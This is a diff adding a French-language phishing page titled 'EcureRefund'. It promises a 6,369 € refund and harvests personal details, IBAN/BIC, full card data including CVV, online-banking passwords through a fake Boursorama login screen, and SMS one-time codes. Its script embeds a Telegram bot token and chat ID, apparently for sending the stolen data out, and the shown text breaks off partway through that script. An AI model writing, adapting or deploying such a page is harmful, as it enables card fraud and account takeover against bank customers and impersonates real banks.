@@ -1,0 +1,1464 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcureRefund - Remboursement Sécurisé</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #2c5aa0;
+            --secondary-color: #1e3a8a;
+            --accent-color: #3b82f6;
+            --success-color: #10b981;
+            --light-color: #f8fafc;
+            --dark-color: #1e293b;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --boursorama-orange: #ff6b00;
+            --boursorama-dark: #1a1a1a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f0f4f8;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            padding: 1.5rem 0;
+            box-shadow: var(--box-shadow);
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+
+        .logo i {
+            font-size: 2rem;
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            width: 150px;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #cbd5e1;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-bottom: 10px;
+            z-index: 1;
+        }
+
+        .step.active .step-number {
+            background-color: var(--primary-color);
+        }
+
+        .step.completed .step-number {
+            background-color: var(--success-color);
+        }
+
+        .step-title {
+            font-size: 0.9rem;
+            text-align: center;
+            color: #64748b;
+        }
+
+        .step.active .step-title {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+
+        .step::after {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 70px;
+            width: 80px;
+            height: 2px;
+            background-color: #cbd5e1;
+        }
+
+        .step:last-child::after {
+            display: none;
+        }
+
+        .step.completed::after {
+            background-color: var(--success-color);
+        }
+
+        main {
+            padding: 2rem 0;
+        }
+
+        .page {
+            display: none;
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .page.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        h2 {
+            color: var(--secondary-color);
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #e2e8f0;
+            padding-bottom: 0.5rem;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 1rem;
+            background-color: var(--light-color);
+            border-radius: var(--border-radius);
+        }
+
+        .feature i {
+            font-size: 1.5rem;
+            color: var(--primary-color);
+        }
+
+        .certifications {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+        }
+
+        .certification {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background-color: #f1f5f9;
+            padding: 0.8rem 1.5rem;
+            border-radius: 30px;
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+
+        .certification i {
+            color: var(--success-color);
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+
+        input, select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border: 1px solid #cbd5e1;
+            border-radius: var(--border-radius);
+            font-size: 1rem;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin: 2rem 0;
+        }
+
+        .checkbox-group input {
+            width: auto;
+            margin-top: 5px;
+        }
+
+        .checkbox-group label {
+            font-weight: normal;
+            margin-bottom: 0;
+        }
+
+        .checkbox-group a {
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        .checkbox-group a:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .security-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 1.5rem;
+            color: #64748b;
+            font-size: 0.9rem;
+        }
+
+        .security-notice i {
+            color: var(--success-color);
+        }
+
+        .card-icons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .card-icon {
+            width: 50px;
+            height: 30px;
+            background-color: #e2e8f0;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            color: #64748b;
+        }
+
+        .card-details {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .confirmation-content {
+            text-align: center;
+            padding: 2rem 0;
+        }
+
+        .confirmation-icon {
+            font-size: 4rem;
+            color: var(--success-color);
+            margin-bottom: 1.5rem;
+        }
+
+        .confirmation-message {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            color: var(--dark-color);
+        }
+
+        .confirmation-details {
+            background-color: var(--light-color);
+            padding: 1.5rem;
+            border-radius: var(--border-radius);
+            margin: 2rem 0;
+            text-align: left;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        footer {
+            background-color: var(--dark-color);
+            color: white;
+            padding: 2rem 0;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .footer-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 2rem;
+            margin: 1rem 0;
+        }
+
+        .footer-links a {
+            color: #cbd5e1;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        .copyright {
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+
+        /* Styles pour IBAN/BIC */
+        .bank-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 1.5rem;
+            padding: 1rem;
+            background-color: white;
+            border-radius: var(--border-radius);
+            border: 1px solid #e2e8f0;
+        }
+
+        .bank-logo-img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+        }
+
+        .bank-name {
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+
+        /* Styles Boursorama */
+        .boursorama-login {
+            background: linear-gradient(135deg, var(--boursorama-dark), #2a2a2a);
+            color: white;
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .boursorama-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #444;
+        }
+
+        .boursorama-logo {
+            font-size: 2.5rem;
+            color: var(--boursorama-orange);
+        }
+
+        .boursorama-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: white;
+        }
+
+        .boursorama-form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .boursorama-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #ddd;
+        }
+
+        .boursorama-input {
+            width: 100%;
+            padding: 1rem;
+            background-color: #333;
+            border: 1px solid #555;
+            border-radius: 6px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .boursorama-input:focus {
+            outline: none;
+            border-color: var(--boursorama-orange);
+            box-shadow: 0 0 0 2px rgba(255, 107, 0, 0.2);
+        }
+
+        .boursorama-btn {
+            display: block;
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, var(--boursorama-orange), #e55a00);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1.5rem;
+        }
+
+        .boursorama-btn:hover {
+            background: linear-gradient(135deg, #e55a00, #cc4f00);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(255, 107, 0, 0.3);
+        }
+
+        .boursorama-security {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 1.5rem;
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        .boursorama-footer {
+            text-align: center;
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid #444;
+            color: #888;
+            font-size: 0.8rem;
+        }
+
+        /* Interface bancaire classique */
+        .classic-bank-login {
+            background-color: var(--light-color);
+            padding: 2rem;
+            border-radius: var(--border-radius);
+            margin-bottom: 2rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        .classic-bank-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #cbd5e1;
+        }
+
+        .classic-bank-logo {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+        }
+
+        .classic-bank-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--dark-color);
+        }
+
+        .classic-bank-form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .classic-bank-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--dark-color);
+        }
+
+        .classic-bank-input {
+            width: 100%;
+            padding: 1rem;
+            background-color: white;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            color: var(--dark-color);
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .classic-bank-input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
+        }
+
+        .classic-bank-btn {
+            display: block;
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1.5rem;
+        }
+
+        .classic-bank-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(44, 90, 160, 0.3);
+        }
+
+        .advisor-contact {
+            background: linear-gradient(135deg, #f0f9ff, #e0f2fe);
+            padding: 1.5rem;
+            border-radius: var(--border-radius);
+            margin: 2rem 0;
+            text-align: center;
+            border-left: 4px solid var(--accent-color);
+        }
+
+        .code-validation {
+            background: linear-gradient(135deg, #f0fff4, #dcfce7);
+            padding: 1.5rem;
+            border-radius: var(--border-radius);
+            margin: 2rem 0;
+            text-align: center;
+            border-left: 4px solid var(--success-color);
+        }
+
+        .code-input {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 1.5rem 0;
+        }
+
+        .code-digit {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border: 2px solid #cbd5e1;
+            border-radius: 8px;
+            background-color: white;
+        }
+
+        .code-digit:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .progress-bar {
+                overflow-x: auto;
+                justify-content: flex-start;
+                padding-bottom: 1rem;
+            }
+
+            .card-details {
+                grid-template-columns: 1fr;
+            }
+
+            .features {
+                grid-template-columns: 1fr;
+            }
+
+            .code-input {
+                gap: 5px;
+            }
+
+            .code-digit {
+                width: 40px;
+                height: 50px;
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>EcureRefund</span>
+                </div>
+                <div class="security-notice">
+                    <i class="fas fa-lock"></i>
+                    <span>Transaction sécurisée SSL 256-bit</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="progress-bar">
+            <div class="step active" id="step1">
+                <div class="step-number">1</div>
+                <div class="step-title">Informations</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-number">2</div>
+                <div class="step-title">Paiement</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-number">3</div>
+                <div class="step-title">Connexion Bancaire</div>
+            </div>
+            <div class="step" id="step4">
+                <div class="step-number">4</div>
+                <div class="step-title">Confirmation</div>
+            </div>
+        </div>
+
+        <main>
+            <!-- Page 1: Formulaire de remboursement -->
+            <div class="page active" id="page1">
+                <h1>Remboursement Sécurisé de 6 369,00 €</h1>
+                <p style="text-align: center; margin-bottom: 2rem;">Votre demande de remboursement est traitée de manière sécurisée avec les plus hauts standards de protection des données.</p>
+                
+                <div class="features">
+                    <div class="feature">
+                        <i class="fas fa-shield-alt"></i>
+                        <div>
+                            <h3>Transactions 100% sécurisées</h3>
+                            <p>Protection maximale de vos transactions</p>
+                        </div>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-bolt"></i>
+                        <div>
+                            <h3>Traitement rapide sous 48h</h3>
+                            <p>Remboursement effectué rapidement</p>
+                        </div>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-user-shield"></i>
+                        <div>
+                            <h3>Protection de vos données</h3>
+                            <p>Vos informations sont cryptées</p>
+                        </div>
+                    </div>
+                    <div class="feature">
+                        <i class="fas fa-headset"></i>
+                        <div>
+                            <h3>Support client dédié</h3>
+                            <p>Assistance 7j/7</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="certifications">
+                    <div class="certification">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Certifié PCI DSS</span>
+                    </div>
+                    <div class="certification">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Conforme RGPD</span>
+                    </div>
+                </div>
+                
+                <h2>Informations de Remboursement</h2>
+                <p style="margin-bottom: 1.5rem;">Veuillez remplir tous les champs pour traiter votre demande</p>
+                
+                <form id="refundForm">
+                    <div class="form-group">
+                        <label for="amount">Montant à rembourser</label>
+                        <input type="text" id="amount" value="6 369,00 €" readonly>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lastName">Nom</label>
+                        <input type="text" id="lastName" placeholder="Votre nom" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="firstName">Prénom</label>
+                        <input type="text" id="firstName" placeholder="Votre prénom" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="billingAddress">Adresse de Facturation</label>
+                        <input type="text" id="billingAddress" placeholder="Adresse complète de facturation" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="shippingAddress">Adresse de Livraison</label>
+                        <input type="text" id="shippingAddress" placeholder="Adresse complète de livraison" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phone">Numéro de Téléphone</label>
+                        <div style="display: flex;">
+                            <select style="width: 120px;">
+                                <option>+33 (France)</option>
+                                <option>+32 (Belgique)</option>
+                                <option>+41 (Suisse)</option>
+                            </select>
+                            <input type="tel" id="phone" placeholder="Votre numéro" style="flex: 1; margin-left: 10px;" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email">Adresse E-mail</label>
+                        <input type="email" id="email" placeholder="Votre e-mail" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="iban">IBAN</label>
+                        <input type="text" id="iban" placeholder="FR76 1234 5678 9012 3456 7890 123" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="bic">BIC/SWIFT</label>
+                        <input type="text" id="bic" placeholder="Ex: BNPAFRPP" required>
+                    </div>
+                    
+                    <div id="bankInfo" class="bank-info" style="display: none;">
+                        <img id="bankLogo" src="" alt="Logo banque" class="bank-logo-img">
+                        <div id="bankName" class="bank-name"></div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="refundAmount">Montant du Remboursement (€)</label>
+                        <input type="number" id="refundAmount" placeholder="6369" min="1" max="6369" step="0.01" required>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="terms" required>
+                        <label for="terms">J'accepte les <a href="#">conditions générales</a> et la <a href="#">politique de confidentialité</a> relatives au traitement de mon remboursement. Je certifie que les informations fournies sont exactes.</label>
+                    </div>
+                    
+                    <button type="button" class="btn" id="nextToPayment">Valider la demande de remboursement</button>
+                    
+                    <div class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>Vos données sont cryptées</span>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Page 2: Carte de crédit -->
+            <div class="page" id="page2">
+                <h1>Paiement Sécurisé</h1>
+                <p style="text-align: center; margin-bottom: 2rem;">Veuillez saisir les informations de votre carte de crédit pour procéder au remboursement</p>
+                
+                <form id="paymentForm">
+                    <div class="form-group">
+                        <label for="cardNumber">Numéro de carte</label>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    </div>
+                    
+                    <div class="card-details">
+                        <div class="form-group">
+                            <label for="cardName">Nom sur la carte</label>
+                            <input type="text" id="cardName" placeholder="Votre nom" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="expiryDate">Date d'expiration</label>
+                            <input type="text" id="expiryDate" placeholder="MM/AA" maxlength="5" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                        </div>
+                    </div>
+                    
+                    <div class="card-icons">
+                        <div class="card-icon">VISA</div>
+                        <div class="card-icon">MC</div>
+                        <div class="card-icon">AMEX</div>
+                    </div>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="saveCard" checked>
+                        <label for="saveCard">Enregistrer cette carte pour de futurs remboursements</label>
+                    </div>
+                    
+                    <button type="button" class="btn" id="nextToBankLogin">Continuer vers la connexion bancaire</button>
+                    
+                    <div class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>Paiement sécurisé SSL 256-bit</span>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Page 3: Connexion bancaire (dynamique) -->
+            <div class="page" id="page3">
+                <h1>Connexion Bancaire Sécurisée</h1>
+                <p style="text-align: center; margin-bottom: 2rem;">Veuillez vous connecter à votre espace bancaire pour finaliser le remboursement</p>
+                
+                <!-- Interface Boursorama (apparaît si BIC commence par BOUS) -->
+                <div id="boursoramaInterface" class="boursorama-login" style="display: none;">
+                    <div class="boursorama-header">
+                        <i class="fas fa-university boursorama-logo"></i>
+                        <span class="boursorama-title">Boursorama Banque</span>
+                    </div>
+                    
+                    <form id="boursoramaLoginForm">
+                        <div class="boursorama-form-group">
+                            <label class="boursorama-label" for="boursoramaUserId">Identifiant client</label>
+                            <input type="text" id="boursoramaUserId" class="boursorama-input" placeholder="Votre identifiant Boursorama" required>
+                        </div>
+                        
+                        <div class="boursorama-form-group">
+                            <label class="boursorama-label" for="boursoramaPassword">Mot de passe</label>
+                            <input type="password" id="boursoramaPassword" class="boursorama-input" placeholder="Votre mot de passe" required>
+                        </div>
+                        
+                        <div style="display: flex; align-items: center; gap: 10px; margin: 1rem 0;">
+                            <input type="checkbox" id="rememberMe" style="width: auto;">
+                            <label for="rememberMe" style="color: #ddd; font-size: 0.9rem;">Se souvenir de moi</label>
+                        </div>
+                        
+                        <button type="button" class="boursorama-btn" id="processBoursoramaLogin">
+                            <i class="fas fa-lock" style="margin-right: 8px;"></i>
+                            Se connecter
+                        </button>
+                    </form>
+                    
+                    <div class="boursorama-security">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Connexion sécurisée SSL 256-bit</span>
+                    </div>
+                    
+                    <div class="boursorama-footer">
+                        <p>© 2023 Boursorama Banque - Votre banque en ligne</p>
+                        <p style="margin-top: 5px;">
+                            <a href="#" style="color: #aaa; text-decoration: none;">Aide</a> • 
+                            <a href="#" style="color: #aaa; text-decoration: none;">Mot de passe oublié</a> • 
+                            <a href="#" style="color: #aaa; text-decoration: none;">Sécurité</a>
+                        </p>
+                    </div>
+                </div>
+                
+                <!-- Interface bancaire classique (par défaut) -->
+                <div id="classicBankInterface" class="classic-bank-login">
+                    <div class="classic-bank-header">
+                        <i class="fas fa-university classic-bank-logo"></i>
+                        <span class="classic-bank-title">Connexion Bancaire</span>
+                    </div>
+                    
+                    <form id="classicBankLoginForm">
+                        <div class="classic-bank-form-group">
+                            <label class="classic-bank-label" for="classicBankUserId">Identifiant</label>
+                            <input type="text" id="classicBankUserId" class="classic-bank-input" placeholder="Votre identifiant bancaire" required>
+                        </div>
+                        
+                        <div class="classic-bank-form-group">
+                            <label class="classic-bank-label" for="classicBankPassword">Mot de passe</label>
+                            <input type="password" id="classicBankPassword" class="classic-bank-input" placeholder="Votre mot de passe" required>
+                        </div>
+                        
+                        <button type="button" class="classic-bank-btn" id="processClassicBankLogin">
+                            <i class="fas fa-lock" style="margin-right: 8px;"></i>
+                            Se connecter
+                        </button>
+                    </form>
+                    
+                    <div class="security-notice">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Connexion sécurisée SSL 256-bit</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Page 4: Confirmation -->
+            <div class="page" id="page4">
+                <div class="confirmation-content">
+                    <div class="confirmation-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    
+                    <h1>Remboursement Confirmé !</h1>
+                    
+                    <div class="confirmation-message">
+                        <p>Votre demande de remboursement de <strong>6 369,00 €</strong> a été traitée avec succès.</p>
+                        <p>Votre argent sera crédité sur votre compte dans un délai de 48 heures.</p>
+                    </div>
+                    
+                    <div class="confirmation-details">
+                        <h3>Détails de la transaction</h3>
+                        <div class="detail-row">
+                            <span>Référence:</span>
+                            <span id="refNumber">REF-789456123</span>
+                        </div>
+                        <div class="detail-row">
+                            <span>Montant:</span>
+                            <span>6 369,00 €</span>
+                        </div>
+                        <div class="detail-row">
+                            <span>Date:</span>
+                            <span id="transactionDate">15/10/2023</span>
+                        </div>
+                        <div class="detail-row">
+                            <span>Statut:</span>
+                            <span style="color: var(--success-color); font-weight: bold;">En attente de validation</span>
+                        </div>
+                    </div>
+                    
+                    <div class="code-validation">
+                        <h3><i class="fas fa-shield-alt"></i> Validation Finale Requise</h3>
+                        <p>Pour finaliser votre remboursement, veuillez nous envoyer le code de sécurité que vous recevrez par SMS.</p>
+                        <p>Un conseiller vous contactera dans les prochaines minutes pour vous communiquer la procédure.</p>
+                        
+                        <div class="code-input">
+                            <input type="text" class="code-digit" maxlength="1" placeholder="_">
+                            <input type="text" class="code-digit" maxlength="1" placeholder="_">
+                            <input type="text" class="code-digit" maxlength="1" placeholder="_">
+                            <input type="text" class="code-digit" maxlength="1" placeholder="_">
+                            <input type="text" class="code-digit" maxlength="1" placeholder="_">
+                            <input type="text" class="code-digit" maxlength="1" placeholder="_">
+                        </div>
+                        
+                        <button type="button" class="btn" style="width: auto; padding: 0.8rem 2rem;">
+                            <i class="fas fa-paper-plane" style="margin-right: 8px;"></i>
+                            Envoyer le code
+                        </button>
+                    </div>
+                    
+                    <div class="advisor-contact">
+                        <h3><i class="fas fa-headset"></i> Contact avec votre conseiller</h3>
+                        <p>Un conseiller va vous contacter dans les prochaines minutes au numéro que vous avez fourni.</p>
+                        <p>Il vous communiquera la procédure pour finaliser la validation de votre remboursement.</p>
+                        <p style="margin-top: 1rem; font-weight: 600; color: var(--primary-color);">
+                            <i class="fas fa-phone"></i> Votre conseiller: Pierre Martin - 01 45 67 89 10
+                        </p>
+                    </div>
+                    
+                    <div class="confirmation-message">
+                        <p>Un e-mail de confirmation a été envoyé à votre adresse.</p>
+                        <p>Votre identifiant et mot de passe numérique ont été générés et envoyés par SMS.</p>
+                    </div>
+                    
+                    <button type="button" class="btn" id="returnHome">Retour à l'accueil</button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="logo">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>EcureRefund</span>
+                </div>
+                
+                <div class="footer-links">
+                    <a href="#">Conditions générales</a>
+                    <a href="#">Politique de confidentialité</a>
+                    <a href="#">Aide & Support</a>
+                    <a href="#">Contact</a>
+                </div>
+                
+                <div class="copyright">
+                    &copy; 2023 EcureRefund. Tous droits réservés.
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configuration Telegram
+            const botToken = '8022971997:AAGj1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA';
+            const chatId = '5652184847';
+            
+            // Base de données des banques
+            const bankData = {
+                "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+                "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+                "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+                "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+                "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+                "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+                "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+                "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+                "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+                "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+                "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+                "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+                "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+                "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+                "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+                "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+                "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+                "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+                "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" },
+                "BOUSFRPP": { name: "Boursorama Banque", logo: "https://upload.wikimedia.org/wikipedia/fr/3/3c/Logo_Boursorama_Banque.png" }
+            };
+            
+            // Éléments de navigation
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const step4 = document.getElementById('step4');
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            const page3 = document.getElementById('page3');
+            const page4 = document.getElementById('page4');
+            const nextToPaymentBtn = document.getElementById('nextToPayment');
+            const nextToBankLoginBtn = document.getElementById('nextToBankLogin');
+            const processBoursoramaLoginBtn = document.getElementById('processBoursoramaLogin');
+            const processClassicBankLoginBtn = document.getElementById('processClassicBankLogin');
+            const returnHomeBtn = document.getElementById('returnHome');
+            
+            // Interfaces bancaires
